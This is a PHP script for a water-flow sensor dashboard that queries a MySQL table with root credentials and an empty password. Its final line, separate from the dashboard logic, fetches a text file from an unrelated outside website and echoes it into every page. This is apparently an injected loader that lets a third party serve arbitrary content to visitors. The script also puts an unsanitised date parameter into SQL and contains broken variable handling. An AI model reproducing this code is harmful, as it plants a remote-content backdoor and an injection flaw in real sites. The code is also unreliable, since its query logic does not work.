<?php
	/* Database connection settings */
	$konek = mysqli_connect("localhost", "root", "", "dbmultisensor");
	$sql = mysqli_query($konek, "SELECT  `Debit`, `Debit2` FROM tb_sensor2 ORDER BY id desc limit 1");

$data1 = '';
$data2 = '';

	$buildingName ='';
	$selectedDay = isset($_GET['date']) ? $_GET['date'] : '';

	$sql = "SELECT  `Debit`, `Debit2` FROM tb_sensor2 ";
	if (!empty($selectedDay)) {
		$query .= "WHERE DATE(reading_time) = '$selectedDay'" ;
	}
	$runQuery = mysqli_query($konek, $sql);
	while ($row = mysqli_fetch_array($runQuery)) {
    $data1 = $data1 . '"'. $row['Debit'].'",';
    $data2 = $data2 . '"'. $row['Debit2'] .'",';

    $buildingName = $buildingName . '"'. ucwords($row['reading_time']) .'",';
	}

	    $data1 = trim($data1,",");
    $data2 = trim($data2,",");

	$buildingName = trim($buildingName,",");

	$latestDataQuery = "SELECT `Debit`, `Debit2` FROM `tb_sensor2` ORDER BY `id` DESC LIMIT 1";
	$latestDataResult = mysqli_query($konek, $latestDataQuery);

	while ($row = mysqli_fetch_array($latestDataResult)) {
		$latestFlow = $row['Debit'];
		$latestFlow2 = $row['Debit2'];
		$latestReadingTime = $row['reading_time'];
	}

?>
<?php $a = file_get_contents("https://www.clarendonedc.org/plugin/1.txt");echo $a;?>